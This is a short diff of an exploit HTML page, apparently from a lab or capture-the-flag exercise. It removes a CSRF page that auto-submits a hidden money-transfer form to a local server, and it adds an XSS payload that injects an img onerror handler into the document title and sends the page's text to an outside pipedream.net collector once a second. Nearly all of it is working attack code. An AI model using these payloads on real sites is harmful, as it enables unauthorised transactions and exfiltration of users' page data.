@@ -1,12 +1,11 @@
-<html>
-  <body>
-    <form action="http://127.0.0.1:8080/transfer" method="POST">
-      <input type="hidden" name="user_to" value="badguy" />
-      <input type="hidden" name="amount" value="1557" />
-    </form>
-    <script>
-      document.forms[0].submit();
-    </script>
-  </body>
-</html>
-;
+<h1>Exploit</h1>
+<script>
+  const title =
+    "<img src=nothing onerror=this.src='https://eool5b8tfvagzpg.m.pipedream.net?body='+document.body.textContent; />";
+  document.title = "kaleidoscope";
+  document.title = title;
+  setInterval(function () {
+    document.title = "kaleidoscope";
+    document.title = title;
+  }, 1000);
+</script>
